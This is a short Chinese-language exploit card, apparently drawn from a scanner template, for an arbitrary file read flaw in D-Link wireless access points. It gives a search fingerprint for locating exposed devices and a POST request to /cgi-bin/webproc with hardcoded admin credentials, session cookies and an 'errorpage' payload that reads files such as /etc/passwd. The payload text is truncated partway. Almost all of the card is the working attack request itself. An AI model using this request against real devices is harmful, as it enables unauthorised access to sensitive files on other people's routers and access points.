# D-linkwireless系列产品存在任意文件读取漏洞

- **系统**：D-linkwireless　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="D-LINK SYSTEMS, INC. | WIRELESS AP | LOGIN"`
- **请求**：`POST /cgi-bin/webproc HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: sessionid=6e089114; sessionid=6e089114; auth=nok; auth=nok; expires=Mon, 31-Jan-…`　`Content-Length: 225`　`id: d-link-wireless-errorpage-fileread`　`name: D-Link Wireless Errorpage Arbitrary File Read`　`author: AX`　`severity: high`　`description: Detects an arbitrary file read vulnerability in the D-Link wireless device's errorpage parameter, allowing unauthorized access to sensitive files like /etc/passwd.`

**请求体 / payload**
```
:action=login&:password=u]H[ww6KrA9F.x-F&:sessionid=6e089114&:username=admin&errorpage={{fileread}}&getpage=html/index.html&obj-action=auth&var:login=true&var:menu=setup&var:page=wizard
- raw:
-
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=6e089114; sessionid=6e089114; auth=nok; auth=nok; expires=Mon, 31-Jan-2050 16:00:00 GMT; expires=Mon, 31-Jan-2050 16:00:00 GMT; Lan_IPAddress=181.39.139.14; langmanulset=yes; sys_UserName=admin; language=en_us
Content-Length: 225
:action=login&:password=u]H[ww6KrA9F.x-F&:sessionid=6e089114&:username=admin&errorpage={{f…（脚本共 898 字，完整版见原文）
```
- **预期**：200　|　—